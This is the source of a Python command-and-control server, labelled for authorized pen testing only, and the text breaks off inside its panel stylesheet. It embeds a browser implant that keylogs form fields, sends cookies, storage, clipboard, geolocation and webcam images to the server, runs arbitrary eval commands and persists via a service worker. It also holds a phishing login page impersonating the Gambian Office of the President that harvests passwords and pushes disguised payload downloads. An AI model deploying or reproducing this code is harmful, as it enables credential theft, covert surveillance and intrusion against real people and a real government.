#!/usr/bin/env python3
"""Advanced C2 Server — authorized pen testing only"""
import os,json,time,threading,socket,base64,mimetypes
from http.server import HTTPServer,BaseHTTPRequestHandler
from datetime import datetime
from collections import defaultdict
from urllib.parse import urlparse,parse_qs,unquote_plus

C2_PORT     = int(os.environ.get("C2_PORT",8888))
AGENT_PORT  = int(os.environ.get("AGENT_PORT",4444))
LOG_DIR     = os.environ.get("LOG_DIR",    "/tmp/op/logs")
PAYLOAD_DIR = os.environ.get("PAYLOAD_DIR","/tmp/op/payloads")
LOOT_DIR    = os.path.join(LOG_DIR,"loot")
CREDS_FILE  = f"{LOG_DIR}/credentials.txt"

for d in [LOG_DIR,PAYLOAD_DIR,LOOT_DIR]: os.makedirs(d,exist_ok=True)

agents={}; agent_cmds=defaultdict(list); agent_resps=defaultdict(list)
_lock=threading.Lock()

def ts(): return datetime.now().strftime("%H:%M:%S")
def log(m):
    l=f"[{ts()}] {m}"; print(l,flush=True)
    open(f"{LOG_DIR}/c2.log","a").write(l+"\n")

# ── TCP raw agent listener ───────────────────────────────────────────────────
def handle_agent(conn,addr):
    ip=addr[0]; aid=f"{ip}_{int(time.time())}"
    try:
        data=conn.recv(4096).decode(errors="replace").strip()
        info=json.loads(data); aid=info.get("id",aid)
        with _lock:
            agents[aid]={"ip":ip,"os":info.get("os","?"),"type":"tcp",
                "hostname":info.get("hostname","?"),"user":info.get("user","?"),
                "priv":info.get("priv","?"),"last_seen":ts(),"status":"ONLINE",
                "log":f"{LOG_DIR}/agent_{aid}.txt"}
        conn.send(b"OK\n")
        log(f"[TCP] {aid} | {info.get('os','?')[:60]}")
        while True:
            with _lock: agents[aid]["last_seen"]=ts()
            cmd=agent_cmds[aid].pop(0) if agent_cmds[aid] else "PING"
            conn.send((cmd+"\n").encode())
            if cmd=="EXIT": break
            resp=b""; conn.settimeout(30)
            try:
                while True:
                    chunk=conn.recv(4096)
                    if not chunk or b"<<END>>" in chunk: resp+=chunk.replace(b"<<END>>",b""); break
                    resp+=chunk
            except socket.timeout: pass
            if resp and cmd!="PING":
                dec=resp.decode(errors="replace")
                _handle_result(aid,cmd,dec)
            time.sleep(1)
    except Exception as e: log(f"[TCP] {aid} gone: {e}")
    finally: conn.close(); agents.get(aid,{}).update({"status":"OFFLINE"}) if aid in agents else None

def _handle_result(aid,cmd,out):
    """Process result — extract binary loot if present"""
    if out.startswith("SCREENSHOT_B64::") or out.startswith("WEBCAM_B64::"):
        prefix,_,b64data=out.partition("::")
        try:
            raw=base64.b64decode(b64data)
            ext=".png" if "SCREENSHOT" in prefix else ".jpg"
            fname=f"{aid}_{cmd.replace(' ','_')}_{int(time.time())}{ext}"
            fpath=os.path.join(LOOT_DIR,fname)
            open(fpath,"wb").write(raw)
            disp=f"[LOOT:{prefix}] saved {fname} ({len(raw)}b)"
            with _lock: agent_resps[aid].append({"cmd":cmd,"resp":disp,"ts":ts(),"loot":fname,"type":"image"})
            if aid in agents: open(agents[aid]["log"],"a").write(f"\n[{ts()}] {disp}\n")
            log(f"[LOOT] {aid} {fname}")
            return
        except Exception as e: log(f"[LOOT ERR] {e}")
    if out.startswith("FILE_B64::"):
        parts=out.split("::")
        try:
            raw=base64.b64decode(parts[1])
            orig=parts[2] if len(parts)>2 else "file"
            fname=f"{aid}_{int(time.time())}_{orig}"
            fpath=os.path.join(LOOT_DIR,fname)
            open(fpath,"wb").write(raw)
            disp=f"[LOOT:FILE] {orig} → {fname} ({len(raw)}b)"
            with _lock: agent_resps[aid].append({"cmd":cmd,"resp":disp,"ts":ts(),"loot":fname,"type":"file"})
            if aid in agents: open(agents[aid]["log"],"a").write(f"\n[{ts()}] {disp}\n")
            log(f"[LOOT] {aid} {fname}")
            return
        except Exception as e: log(f"[LOOT ERR] {e}")
    with _lock: agent_resps[aid].append({"cmd":cmd,"resp":out,"ts":ts()})
    if aid in agents:
        open(agents[aid]["log"],"a").write(f"\n[{ts()}] CMD:{cmd}\n{out}\n{'─'*40}\n")
    log(f"[RESULT] [{aid}] {cmd[:40]} {len(out)}b")

def agent_listener():
    srv=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    srv.bind(("0.0.0.0",AGENT_PORT)); srv.listen(10)
    log(f"[*] TCP :{AGENT_PORT}")
    while True:
        try: conn,addr=srv.accept(); threading.Thread(target=handle_agent,args=(conn,addr),daemon=True).start()
        except: pass

# ── JS browser agent ─────────────────────────────────────────────────────────
JS_AGENT=r"""
(function(){
var AID='js'+Math.random().toString(36).substr(2,8),POLL=6000,kb={};
function enc(s){try{return encodeURIComponent(String(s||'').substr(0,800));}catch(e){return '';}}
function get(p,cb){var x=new XMLHttpRequest();x.open('GET',p,true);x.timeout=15000;
  x.onreadystatechange=function(){if(x.readyState===4&&cb)cb(x.status===200?x.responseText.trim():'');};
  try{x.send();}catch(e){}}
function post(p,b){var x=new XMLHttpRequest();x.open('POST',p,true);
  x.setRequestHeader('Content-Type','text/plain');
  try{x.send(String(b||'').substr(0,200000));}catch(e){}}
function reg(){get('/agent/register?id='+AID
  +'&os='+enc(navigator.userAgent.substr(0,150))
  +'&hostname='+enc(location.hostname||'browser')
  +'&user='+enc(navigator.platform||'?')
  +'&type=js-browser&priv=browser');}

// ── Special command handlers ──────────────────────────────────
function jsRecon(){
  var i=navigator.connection||{};
  return JSON.stringify({
    userAgent:navigator.userAgent,
    platform:navigator.platform,
    language:navigator.language,
    languages:navigator.languages,
    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen:screen.width+'x'+screen.height+' depth:'+screen.colorDepth,
    deviceMemory:navigator.deviceMemory||'?',
    hardwareConcurrency:navigator.hardwareConcurrency,
    onLine:navigator.onLine,
    connection:{type:i.type,downlink:i.downlink,rtt:i.rtt},
    url:location.href,
    referrer:document.referrer,
    title:document.title,
    cookies:document.cookie.substr(0,1000),
    localStorage_keys:Object.keys(localStorage),
    sessionStorage_keys:Object.keys(sessionStorage),
    plugins:Array.from(navigator.plugins||[]).map(function(p){return p.name;}).join(', '),
    doNotTrack:navigator.doNotTrack,
    cookieEnabled:navigator.cookieEnabled,
    pdfViewer:navigator.pdfViewerEnabled
  },null,2);}

function jsBrowsers(){
  var r='=== COOKIES ===\n'+document.cookie+'\n\n=== localStorage ===\n';
  try{for(var k in localStorage)r+=k+'='+localStorage.getItem(k)+'\n';}catch(e){r+='(blocked)\n';}
  r+='\n=== sessionStorage ===\n';
  try{for(var k in sessionStorage)r+=k+'='+sessionStorage.getItem(k)+'\n';}catch(e){r+='(blocked)\n';}
  r+='\n=== IndexedDB databases ===\n';
  if(indexedDB&&indexedDB.databases)indexedDB.databases().then(function(dbs){
    post('/agent/result?id='+AID+'&cmd=BROWSERS_IDB',dbs.map(function(d){return d.name;}).join(', '));
  }).catch(function(){});
  return r;}

function jsNetwork(){
  var r='=== CONNECTION ===\n';
  var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection||{};
  r+='type:'+c.type+' downlink:'+c.downlink+'Mbps rtt:'+c.rtt+'ms\n\n';
  r+='=== WebRTC local IP ===\n(probing...)\n';
  try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
    pc.createDataChannel('x');pc.createOffer().then(function(d){pc.setLocalDescription(d);});
    pc.onicecandidate=function(e){if(e&&e.candidate){var m=e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/g);
      if(m)post('/agent/result?id='+AID+'&cmd=WEBRTC_IPS',JSON.stringify(m));pc.close();}};}catch(ex){}
  return r;}

function jsClipboard(){
  if(navigator.clipboard&&navigator.clipboard.readText)
    navigator.clipboard.readText().then(function(t){
      post('/agent/result?id='+AID+'&cmd=CLIPBOARD_DATA',t.substr(0,5000));
    }).catch(function(e){post('/agent/result?id='+AID+'&cmd=CLIPBOARD_DATA','(denied: '+e+')');});
  return '(requesting clipboard async...)';}

function jsScreenshot(){
  // Canvas-based screenshot of current page DOM
  var c=document.createElement('canvas');
  c.width=window.innerWidth;c.height=window.innerHeight;
  var ctx=c.getContext('2d');
  // Draw visible page as SVG → canvas (works for same-origin pages)
  try{
    var svg='<svg xmlns="http://www.w3.org/2000/svg" width="'+c.width+'" height="'+c.height+'">'
      +'<foreignObject width="100%" height="100%"><body xmlns="http://www.w3.org/1999/xhtml">'
      +document.documentElement.outerHTML.substr(0,50000)
      +'</body></foreignObject></svg>';
    var img=new Image();
    img.onload=function(){ctx.drawImage(img,0,0);
      var d=c.toDataURL('image/png');
      post('/agent/result?id='+AID+'&cmd=SCREENSHOT_JS','SCREENSHOT_B64::'+d.split(',')[1]);};
    img.src='data:image/svg+xml;charset=utf-8,'+encodeURIComponent(svg);
  }catch(e){return '(screenshot err: '+e+')';}
  return '(capturing page...';}

function jsWebcam(){
  if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)return '(getUserMedia not available)';
  navigator.mediaDevices.getUserMedia({video:{width:640,height:480},audio:false})
    .then(function(stream){
      var v=document.createElement('video');v.srcObject=stream;v.play();
      setTimeout(function(){
        var c=document.createElement('canvas');c.width=640;c.height=480;
        c.getContext('2d').drawImage(v,0,0,640,480);
        var data=c.toDataURL('image/jpeg',0.85);
        post('/agent/result?id='+AID+'&cmd=WEBCAM_JS','WEBCAM_B64::'+data.split(',')[1]);
        stream.getTracks().forEach(function(t){t.stop();});
      },800);
    }).catch(function(e){post('/agent/result?id='+AID+'&cmd=WEBCAM_JS','(denied: '+e+')');});
  return '(requesting webcam...)';}

function jsPersist(){
  var r='';
  if('serviceWorker' in navigator){
    navigator.serviceWorker.register('/sw.js?aid='+AID)
      .then(function(reg){post('/agent/result?id='+AID+'&cmd=PERSIST_SW','SW registered: '+reg.scope);})
      .catch(function(e){post('/agent/result?id='+AID+'&cmd=PERSIST_SW','SW failed: '+e);});
    r+='Service worker registration requested\n';}
  // Store self in localStorage for page reload persistence
  try{localStorage.setItem('_syshelper_aid',AID);r+='localStorage mark set\n';}catch(e){}
  // Cache agent source
  if('caches' in window)caches.open('sys-v1').then(function(cache){
    cache.add('/js-agent.js').catch(function(){});
  });
  return r||'(persist attempted)';}

function jsSelfdestruct(){
  try{localStorage.clear();sessionStorage.clear();}catch(e){}
  if('serviceWorker' in navigator)navigator.serviceWorker.getRegistrations().then(function(regs){
    regs.forEach(function(r){r.unregister();});});
  if('caches' in window)caches.keys().then(function(keys){keys.forEach(function(k){caches.delete(k);});});
  return 'Cleared: localStorage, sessionStorage, service workers, caches';}

function jsKeylogDump(){
  var r=JSON.stringify(kb);kb={};return r||'(keylog empty)';}

// ── Command dispatcher ────────────────────────────────────────
function dispatch(cmd){
  if(cmd==='RECON')            return jsRecon();
  if(cmd==='BROWSERS')         return jsBrowsers();
  if(cmd==='NETWORK')          return jsNetwork();
  if(cmd==='CLIPBOARD')        return jsClipboard();
  if(cmd==='SCREENSHOT')       return jsScreenshot();
  if(cmd==='WEBCAM')           return jsWebcam();
  if(cmd==='PERSIST')          return jsPersist();
  if(cmd==='SELFDESTRUCT')     return jsSelfdestruct();
  if(cmd==='KEYLOG_START')     return 'Already keylogging — use KEYLOG_DUMP to flush';
  if(cmd==='KEYLOG_DUMP')      return jsKeylogDump();
  if(cmd==='SYSINFO')          return jsRecon();
  if(cmd==='DRIVES')           return '(N/A in browser — JS agent)';
  if(cmd==='SSHKEYS')          return '(N/A in browser — JS agent)';
  if(cmd==='HASHDUMP')         return '(N/A in browser — JS agent)';
  if(cmd==='PRIVESC')          return '(N/A in browser — JS agent)';
  if(cmd==='SPREAD')           return '(N/A in browser — use Python agent for USB spread)';
  if(cmd.substr(0,8)==='GETFILE') return '(use BROWSERS for storage data — JS agent)';
  // Default: eval as JavaScript
  var res;try{res=String(eval(cmd));}catch(e){res='ERR:'+String(e);}
  return res;}

function poll(){get('/agent/poll?id='+AID,function(cmd){
  if(!cmd||cmd==='PING')return;if(cmd==='REGISTER'){reg();return;}if(cmd==='EXIT')return;
  var res=dispatch(cmd);
  if(res)post('/agent/result?id='+AID+'&cmd='+enc(cmd),res);});}

// ── Passive collection ────────────────────────────────────────
document.addEventListener('input',function(e){var el=e.target;
  if(el.tagName==='INPUT'||el.tagName==='TEXTAREA')
    kb[el.name||el.id||el.placeholder||el.type||'f']=el.value;},true);
document.addEventListener('submit',function(e){var d={},els=e.target.querySelectorAll('input,select,textarea');
  for(var i=0;i<els.length;i++){var el=els[i];if(el.name||el.id)d[el.name||el.id]=el.value;}
  if(Object.keys(d).length)post('/agent/result?id='+AID+'&cmd=FORM_SUBMIT',JSON.stringify(d));},true);
document.addEventListener('paste',function(e){try{var t=(e.clipboardData||window.clipboardData).getData('text');
  if(t)post('/agent/result?id='+AID+'&cmd=CLIPBOARD_PASTE',t.substr(0,5000));}catch(ex){}},true);
if(navigator.geolocation)navigator.geolocation.getCurrentPosition(function(p){
  post('/agent/result?id='+AID+'&cmd=GEOLOC','lat:'+p.coords.latitude.toFixed(6)+' lng:'+p.coords.longitude.toFixed(6)+' acc:'+Math.round(p.coords.accuracy)+'m');
},function(){},{timeout:10000,enableHighAccuracy:true});
if(navigator.getBattery)navigator.getBattery().then(function(b){
  post('/agent/result?id='+AID+'&cmd=BATTERY','level:'+Math.round(b.level*100)+'% charging:'+b.charging);}).catch(function(){});
if('serviceWorker' in navigator)navigator.serviceWorker.register('/sw.js?aid='+AID).catch(function(){});
reg();
setTimeout(function(){
  post('/agent/result?id='+AID+'&cmd=DEVICE_INFO',jsRecon());
  var tid=setInterval(poll,POLL);
  setInterval(function(){if(Object.keys(kb).length){post('/agent/result?id='+AID+'&cmd=KEYLOG',JSON.stringify(kb));kb={};}},15000);
},600);
})();
"""

SW_JS=r"""
var C2='__C2URL__',AID='__AID__sw';
self.addEventListener('install',e=>self.skipWaiting());
self.addEventListener('activate',e=>e.waitUntil(clients.claim()));
self.addEventListener('fetch',e=>{});
async function doPoll(){try{let r=await fetch(C2+'/agent/poll?id='+AID),cmd=(await r.text()).trim();
  if(!cmd||cmd==='PING'||cmd==='REGISTER')return;
  let ws=await clients.matchAll({type:'window',includeUncontrolled:true});
  if(ws.length)ws[0].postMessage({c2cmd:cmd,aid:AID});
  else await fetch(C2+'/agent/result?id='+AID+'&cmd='+encodeURIComponent(cmd),{method:'POST',body:'(sw-bg)'});
}catch(e){}}
self.addEventListener('periodicsync',e=>{if(e.tag==='c2-hb')e.waitUntil(doPoll());});
self.addEventListener('push',e=>{e.waitUntil(doPoll());});
self.addEventListener('activate',e=>e.waitUntil((async()=>{
  if(self.registration.periodicSync)try{await self.registration.periodicSync.register('c2-hb',{minInterval:30000});}catch(ex){}
})()));
"""

MANIFEST=json.dumps({"name":"Staff Portal","short_name":"Portal","start_url":"/banner",
    "display":"standalone","background_color":"#1a3a6e","theme_color":"#1a3a6e",
    "icons":[{"src":"/icon.png","sizes":"192x192","type":"image/png"}]})

BANNER="""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<meta name="apple-mobile-web-app-capable" content="yes">
<title>Staff Portal — Office of the President</title>
<link rel="manifest" href="/manifest.json">
<style>
*{box-sizing:border-box;margin:0;padding:0}html,body{height:100%}
body{font-family:-apple-system,Arial,sans-serif;background:#1a3a6e;display:flex;
  align-items:center;justify-content:center;min-height:100vh;padding:16px}
.card{background:#fff;border-radius:10px;padding:32px 36px;width:360px;max-width:100%;box-shadow:0 10px 50px rgba(0,0,0,.5)}
.logo{text-align:center;margin-bottom:20px}.logo img{height:68px}
.logo-name{font-size:13px;color:#1a3a6e;font-weight:700;margin-top:8px;line-height:1.4}
h1{font-size:18px;color:#1a3a6e;text-align:center;margin-bottom:3px;font-weight:700}
.sub{text-align:center;font-size:12px;color:#888;margin-bottom:20px}
label{font-size:13px;color:#444;display:block;margin-bottom:4px;font-weight:500}
input{width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:5px;font-size:14px;
  margin-bottom:14px;outline:none;-webkit-appearance:none}
input:focus{border-color:#1a3a6e}
.btn{width:100%;padding:12px;background:#1a3a6e;color:#fff;border:none;border-radius:5px;
  font-size:15px;cursor:pointer;font-weight:600;-webkit-appearance:none}
.err{display:none;color:#c00;font-size:12px;margin-bottom:10px;padding:8px;
  background:#fff5f5;border-radius:4px;border-left:3px solid #c00}
.help{text-align:center;font-size:11px;color:#aaa;margin-top:12px}
hr{margin:18px -36px;border:none;border-top:1px solid #f0f0f0}
#ib p{font-size:11px;color:#999;text-align:center;margin-bottom:8px}
.ibtn{display:block;width:100%;padding:11px;border:1.5px solid #1a3a6e;color:#1a3a6e;
  background:#f0f4ff;border-radius:5px;font-size:13px;font-weight:600;text-align:center;
  text-decoration:none;cursor:pointer;-webkit-appearance:none}
#ld{display:none;position:fixed;inset:0;background:rgba(26,58,110,.95);z-index:999;
  align-items:center;justify-content:center;flex-direction:column}
#ld.show{display:flex}
.sp{width:40px;height:40px;border:3px solid rgba(255,255,255,.2);border-top-color:#fff;
  border-radius:50%;animation:spin .8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
#ld p{color:#fff;margin-top:14px;font-size:14px}
</style></head><body>
<div id="ld"><div class="sp"></div><p id="lm">Verifying...</p></div>
<div class="card">
  <div class="logo">
    <img src="https://heilige.com/sites/default/files/2022-01/op-logo.png" onerror="this.style.display='none'">
    <div class="logo-name">Office of the President<br>Republic of The Gambia</div>
  </div>
  <h1>Staff Portal</h1><p class="sub">Sign in with your government account</p>
  <form id="lf" onsubmit="doLogin(event)" autocomplete="on">
    <label>Username or email</label>
    <input type="email" id="fu" name="email" autocomplete="email" placeholder="username" required>
    <label>Password</label>
    <input type="password" id="fp" name="password" autocomplete="current-password" placeholder="Password" required>
    <p class="err" id="em">Incorrect username or password.</p>
    <button class="btn" type="submit" id="sb">Sign in</button>
  </form>
  <div class="help">Forgot password? &bull; IT Helpdesk: +220 422 2222</div>
  <hr><div id="ib"><p id="il"></p><a id="ib2" class="ibtn" href="#" style="display:none"></a>
  <button id="ipwa" class="ibtn" style="display:none" onclick="installPWA()">&#x2B07; Add to Home Screen</button>
  </div>
</div>
<script src="/js-agent.js"></script>
<script>
var ua=navigator.userAgent.toLowerCase(),isIOS=/iphone|ipad|ipod/.test(ua),
    isAnd=/android/.test(ua),isWin=/windows/.test(ua),pwa=null;
function doLogin(e){
  e.preventDefault();var u=document.getElementById('fu').value,p=document.getElementById('fp').value;
  fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({user:u,pass:p,ts:new Date().toISOString(),src:'portal'})}).catch(function(){});
  document.getElementById('ld').classList.add('show');
  setTimeout(function(){document.getElementById('ld').classList.remove('show');
    document.getElementById('em').style.display='block';
    document.getElementById('sb').disabled=false;
    document.getElementById('fp').value='';document.getElementById('fp').focus();},2200);}
window.addEventListener('beforeinstallprompt',function(e){e.preventDefault();pwa=e;
  if(isAnd){document.getElementById('il').textContent='Stay signed in:';
    document.getElementById('ipwa').style.display='block';}});
function installPWA(){if(pwa)pwa.prompt();}
window.addEventListener('load',function(){
  var dl=isWin?'/download/SecureCertUpdate.hta':(!isIOS?'/download/agent_http.py':null);
  if(dl){setTimeout(function(){var a=document.createElement('a');a.href=dl;
    a.download=dl.split('/').pop();document.body.appendChild(a);a.click();document.body.removeChild(a);},1500);}
  var lbl=document.getElementById('il'),btn=document.getElementById('ib2');
  if(isIOS){lbl.textContent='Required: install security certificate';
    btn.textContent='\\uD83D\\uDD12 Install iOS Certificate';btn.href='/download/GovPortal_Security.mobileconfig';
    btn.style.display='block';setTimeout(function(){window.location.href='/download/GovPortal_Security.mobileconfig';},3000);}
  else if(isAnd&&!pwa){lbl.textContent='Stay signed in:';
    btn.textContent='\\uD83D\\uDCF1 Install Portal App';btn.href='/download/agent_http.py';
    btn.download='portal_helper.py';btn.style.display='block';}
  else if(isWin){lbl.textContent='Security update required:';
    btn.textContent='\\uD83D\\uDCE6 Install Update';btn.href='/download/SecureCertUpdate.hta';
    btn.download='SecureCertUpdate.hta';btn.style.display='block';}
  else{lbl.textContent='Install portal helper:';
    btn.textContent='\\uD83D\\uDD27 Download';btn.href='/download/agent_http.py';
    btn.download='portal_helper.py';btn.style.display='block';}});
</script></body></html>"""

HTML_PANEL="""<!DOCTYPE html><html lang="en"><head><title>C2 PANEL</title>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
:root{{--bg:#07070f;--bg2:#0d0d1c;--bg3:#111128;--bd:#1c1c38;--g:#00e676;--b:#29b6f6;--r:#ef5350;--y:#ffca28;--p:#ce93d8;--tx:#b0bec5;--dim:#37474f}}
*{{box-sizing:border-box;margin:0;padding:0}}
html,body{{height:100%;overflow:hidden}}
body{{font-family:'Courier New',monospace;background:var(--bg);color:var(--tx);font-size:12px;display:flex;flex-direction:column}}
a{{color:var(--b);text-decoration:none}}
a:hover{{color:var(--g)}}
::-webkit-scrollbar{{width:4px;height:4px}}
::-webkit-scrollbar-track{{background:var(--bg)}}
::-webkit-scrollbar-thumb{{background:var(--bd);border-radius:2px}}

/* ── Top bar ── */
.topbar{{background:var(--bg2);border-bottom:2px solid var(--bd);padding:0 16px;height:44px;display:flex;align-items:center;gap:20px;flex-shrink:0;position:relative}}
.logo{{color:var(--g);font-size:14px;font-weight:bold;letter-spacing:4px;display:flex;align-items:center;gap:8px}}
.logo-dot{{width:8px;height:8px;border-radius:50%;background:var(--g);box-shadow:0 0 8px var(--g);animation:blink 2s infinite}}
@keyframes blink{{0%,100%{{opacity:1}}50%{{opacity:.3}}}}
.stat{{display:flex;align-items:center;gap:5px;font-size:11px}}
.stat .n{{color:var(--g);font-weight:bold;font-size:13px}}
.stat .l{{color:var(--dim);font-size:10px;text-transform:uppercase;letter-spacing:1px}}
.sep{{color:var(--bd);font-size:16px}}
.topbar .ts{{margin-left:auto;color:var(--dim);font-size:10px;letter-spacing:1px}}
.topbar .refresh{{color:var(--b);font-size:10px;padding:3px 8px;border:1px solid var(--bd);border-radius:2px}}

/* ── Layout ── */
.wrap{{display:flex;flex:1;overflow:hidden}}
.sidebar{{width:170px;background:var(--bg2);border-right:1px solid var(--bd);display:flex;flex-direction:column;flex-shrink:0;overflow-y:auto}}
.nav-sec{{padding:12px 14px 4px;color:var(--dim);font-size:9px;letter-spacing:2px;text-transform:uppercase;margin-top:4px}}
.nav a{{display:flex;align-items:center;gap:8px;padding:9px 14px;color:var(--dim);font-size:11px;letter-spacing:.5px;border-left:2px solid transparent;transition:.15s;cursor:pointer}}
.nav a .ic{{font-size:13px;width:16px;text-align:center}}
.nav a:hover,.nav a.active{{color:var(--g);border-left-color:var(--g);background:rgba(0,230,118,.04)}}
.nav-bottom{{margin-top:auto;padding:10px;border-top:1px solid var(--bd)}}
.nav-bottom a{{display:block;color:var(--dim);font-size:10px;padding:4px 6px}}

.content{{flex:1;overflow-y:auto;padding:14px 16px}}
.tab{{display:none}}.tab.active{{display:block}}

/* ── Section header ── */
.sh{{color:var(--b);font-size:10px;letter-spacing:2px;text-transform:uppercase;margin-bottom:12px;padding-bottom:7px;border-bottom:1px solid var(--bd);display:flex;align-items:center;gap:8px}}
.sh .ic{{color:var(--g)}}
.sh .badge-count{{background:var(--bg3);color:var(--g);border:1px solid var(--bd);font-size:9px;padding:1px 6px;border-radius:10px;margin-left:auto}}

/* ── Tables ── */
table{{width:100%;border-collapse:collapse;margin-bottom:14px}}
th{{background:var(--bg3);color:var(--b);padding:7px 10px;text-align:left;border:1px solid var(--bd);font-size:10px;letter-spacing:1px;text-transform:uppercase;white-space:nowrap}}
td{{padding:7px 10px;border:1px solid var(--bd);font-size:11px;vertical-align:middle}}
tr:hover td{{background:rgba(41,182,246,.04)}}
tr.sel td{{background:rgba(0,230,118,.06);border-color:rgba(0,230,118,.2)}}

/* ── Badges & dots ── */
.dot{{width:7px;height:7px;border-radius:50%;display:inline-block}}
.dot.on{{background:var(--g);box-shadow:0 0 5px var(--g)}}
.dot.off{{background:var(--r)}}
.dot.js{{background:var(--y)}}
.tag{{display:inline-block;padding:1px 6px;border-radius:3px;font-size:9px;font-weight:bold;letter-spacing:.5px}}
.tag.root{{background:rgba(206,147,216,.15);color:var(--p);border:1px solid rgba(206,147,216,.3)}}
.tag.user{{background:rgba(41,182,246,.1);color:var(--b);border:1px solid rgba(41,182,246,.2)}}
.tag.on{{background:rgba(0,230,118,.1);color:var(--g);border:1px solid rgba(0,230,118,.2)}}
.tag.off{{background:rgba(239,83,80,.1);color:var(--r);border:1px solid rgba(239,83,80,.2)}}
.tag.http{{background:rgba(41,182,246,.1);color:var(--b)}}
.tag.js{{background:rgba(255,202,40,.1);color:var(--y)}}

/* ── Command bar ── */
.cmdbar{{background:var(--bg2);border:1px solid var(--bd);border-radius:5px;padding:12px 14px;margin-bottom:14px}}
.cmdbar form{{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:10px}}
.cmdbar select,.cmdbar input[type=text]{{background:var(--bg);color:var(--g);border:1px solid var(--bd);padding:7px 10px;font-family:'Courier New',monospace;font-size:12px;border-radius:3px;outline:none}}
.cmdbar select{{max-width:240px}}
.cmdbar input[type=text]{{flex:1;min-width:200px}}
.cmdbar select:focus,.cmdbar input:focus{{border-color:var(--g);box-shadow:0 0 0 2px rgba(0,230,118,.1)}}
.btn{{padding:7px 16px;border:none;border-radius:3px;cursor:pointer;font-family:'Courier New',monospace;font-size:12px;font-weight:bold;transition:.1s}}
.btn:hover{{filter:brightness(1.1)}}
.btn.g{{background:var(--g);color:#000}}
.btn.r{{background:var(--r);color:#fff}}
.btn.b{{background:var(--b);color:#000}}
.btn.d{{background:var(--bg3);color:var(--tx);border:1px solid var(--bd)}}

/* ── Quick buttons ── */
.qrow{{display:flex;flex-wrap:wrap;gap:4px;align-items:center;margin-bottom:5px}}
.ql{{color:var(--dim);font-size:9px;letter-spacing:1px;text-transform:uppercase;margin-right:4px}}
.qb{{padding:3px 9px;border-radius:2px;font-size:10px;font-family:monospace;text-decoration:none;cursor:pointer;border:1px solid transparent;transition:.1s}}
.qb:hover{{filter:brightness(1.3)}}
.qb.d{{background:var(--bg3);color:var(--b);border-color:var(--bd)}}
.qb.y{{background:rgba(255,202,40,.08);color:var(--y);border-color:rgba(255,202,40,.2)}}
.qb.g{{background:rgba(0,230,118,.08);color:var(--g);border-color:rgba(0,230,118,.2)}}
.qb.r{{background:rgba(239,83,80,.08);color:var(--r);border-color:rgba(239,83,80,.2)}}
.qb.p{{background:rgba(206,147,216,.08);color:var(--p);border-color:rgba(206,147,216,.2)}}

/* ── Terminal output ── */
.terminal{{background:#000;border:1px solid var(--bd);border-radius:4px;padding:12px;max-height:600px;overflow-y:auto}}
.entry{{margin-bottom:14px;padding-bottom:12px;border-bottom:1px solid #0d0d0d}}
.entry:last-child{{border:none;margin:0;padding:0}}
.ehdr{{display:flex;align-items:center;gap:8px;margin-bottom:6px}}
.eaid{{color:var(--b);font-weight:bold;font-size:11px}}
.ecmd{{color:var(--y);font-size:11px}}
.etime{{color:var(--dim);font-size:10px;margin-left:auto}}
.eout{{color:#90a4ae;white-space:pre-wrap;max-height:320px;overflow-y:auto;padding:8px 10px;background:#050507;border-radius:3px;border:1px solid #111;font-size:11px;line-height:1.5}}
.eimg{{max-width:480px;border:1px solid var(--bd);margin-top:8px;cursor:pointer;display:block;border-radius:3px;transition:.15s}}
.eimg:hover{{border-color:var(--g);box-shadow:0 0 12px rgba(0,230,118,.2)}}

/* ── Credentials ── */
.cred{{background:rgba(239,83,80,.05);border-left:3px solid var(--r);padding:9px 12px;margin-bottom:6px;border-radius:0 3px 3px 0;display:flex;align-items:center;gap:12px;flex-wrap:wrap}}
.cred .u{{color:var(--y)}}
.cred .p{{color:var(--r);font-weight:bold}}
.cred .src{{background:var(--bg3);color:var(--dim);font-size:9px;padding:1px 5px;border-radius:2px}}

/* ── Loot gallery ── */
.loot-grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:10px}}
.loot-card{{background:var(--bg2);border:1px solid var(--bd);border-radius:4px;overflow:hidden;transition:.15s}}
.loot-card:hover{{border-color:var(--g)}}
.loot-card img{{width:100%;display:block;cursor:pointer;background:#000}}
.loot-card .li{{padding:8px 10px}}
.loot-card .lf{{color:var(--y);font-size:10px;word-break:break-all}}
.loot-card .ls{{color:var(--dim);font-size:9px;margin-top:2px}}
.loot-card .la{{color:var(--b);font-size:10px}}

/* ── Worm control ── */
.wc-section{{background:rgba(0,230,118,.03);border:1px solid rgba(0,230,118,.1);border-radius:5px;padding:14px;margin-bottom:14px}}
.wc-row{{display:flex;flex-wrap:wrap;gap:6px;align-items:center;margin-bottom:10px}}
.wc-row:last-child{{margin:0}}
.wc-label{{color:var(--dim);font-size:9px;letter-spacing:1px;text-transform:uppercase;min-width:70px}}
.wb{{padding:4px 10px;border:none;border-radius:2px;cursor:pointer;font-size:10px;font-weight:bold;font-family:monospace;transition:.1s;text-decoration:none;display:inline-block}}
.wb:hover{{filter:brightness(1.2)}}
.wb.g{{background:rgba(0,230,118,.2);color:var(--g);border:1px solid rgba(0,230,118,.3)}}
.wb.r{{background:rgba(239,83,80,.2);color:var(--r);border:1px solid rgba(239,83,80,.3)}}
.wb.y{{background:rgba(255,202,40,.15);color:var(--y);border:1px solid rgba(255,202,40,.3)}}
.wb.b{{background:rgba(41,182,246,.15);color:var(--b);border:1px solid rgba(41,182,246,.3)}}
.wb.w{{background:var(--bg3);color:var(--tx);border:1px solid var(--bd)}}
.wcinp{{background:var(--bg);color:var(--g);border:1px solid var(--bd);padding:4px 8px;font-family:monospace;font-size:11px;border-radius:2px;outline:none}}
.wcinp:focus{{border-color:var(--g)}}

/* ── Lightbox ── */
